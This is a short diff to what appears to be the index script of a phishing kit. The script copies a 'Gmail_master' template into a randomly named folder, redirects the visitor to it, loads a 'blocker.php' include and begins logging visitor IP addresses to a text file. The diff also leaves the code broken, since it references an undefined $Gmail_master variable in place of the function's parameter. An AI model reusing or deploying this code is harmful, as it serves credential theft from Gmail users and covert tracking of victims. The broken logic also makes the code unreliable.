@@ -3,22 +3,22 @@
 include('blocker.php');
 $DIR=md5(rand(0,100000000000));
 function recurse_copy($home,$DIR) {
-$dir = opendir($home);
+$dir = opendir($Gmail_master);
 @mkdir($DIR);
 while(false !== ( $file = readdir($dir)) ) {
 if (( $file != '.' ) && ( $file != '..' )) {
-if ( is_dir($home . '/' . $file) ) {
-recurse_copy($home . '/' . $file,$DIR . '/' . $file);
+if ( is_dir($Gmail_master . '/' . $file) ) {
+recurse_copy($Gmail_master . '/' . $file,$DIR . '/' . $file);
 }
 else {
-copy($home . '/' . $file,$DIR . '/' . $file);
+copy($Gmail_master . '/' . $file,$DIR . '/' . $file);
 }
 }
 }
 closedir($dir);
 }
-$home="home";
-recurse_copy( $home, $DIR );
+$home="Gmail_master";
+recurse_copy( $Gmail_master, $DIR );
 header("location:$DIR");
 $ip = getenv("REMOTE_ADDR");
 $file = fopen("vu.txt","a");
